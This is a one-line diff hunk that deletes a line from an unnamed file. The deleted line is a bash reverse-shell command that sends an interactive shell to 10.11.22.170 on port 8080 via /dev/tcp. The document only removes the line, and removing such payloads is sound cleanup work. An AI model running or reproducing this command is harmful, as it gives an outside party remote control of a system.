@@ -1,1 +1,0 @@
-bash -c 'exec bash -i &>/dev/tcp/10.11.22.170/8080 <&1'
